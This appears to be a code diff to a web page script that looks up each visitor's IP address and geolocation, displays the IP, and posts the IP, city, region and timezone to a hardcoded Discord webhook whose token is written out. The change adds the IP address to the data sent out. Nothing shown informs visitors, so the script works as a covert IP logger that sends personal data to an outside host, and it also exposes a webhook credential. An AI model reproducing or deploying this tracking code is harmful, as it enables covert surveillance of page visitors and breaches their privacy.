@@ -25,14 +25,22 @@
     return data;
   }
 
-  // Function to send data to Discord webhook
-  async function sendToDiscord(locationInfo) {
+  // Function to send data to Discord webhook as an embed message
+  async function sendToDiscord(ipAddress, locationInfo) {
     const { city, region, timezone } = locationInfo;
     const webhookURL = 'https://discord.com/api/webhooks/1197305813530841088/k0OWavGsfYq-kjkY8l77BPXGWX__1X_VKcMs52ootmKOH7gt7WC81zLZ6eiCsisbVWS6'; // Replace with your Discord webhook URL
 
-    // Create payload for Discord webhook
+    // Create payload for Discord webhook as an embed message
     const payload = {
-        content: `User's Location: ${city}, ${region}, Timezone: ${timezone}`,
+        embeds: [{
+            title: ipAddress,
+            fields: [
+                { name: "City", value: city, inline: true },
+                { name: "Region", value: region, inline: true },
+                { name: "Timezone", value: timezone, inline: true },
+            ],
+            color: 0x3498db, // Set the color of the embed (Hex color code)
+        }],
     };
 
     // Send data to Discord webhook
@@ -53,7 +61,7 @@
       document.getElementById('ipAddress').innerText = ipAddress;
       
       const locationInfo = await getLocationInfo(ipAddress);
-      await sendToDiscord(locationInfo);
+      await sendToDiscord(ipAddress, locationInfo);
     } catch (error) {
       console.error('Error:', error);
     }
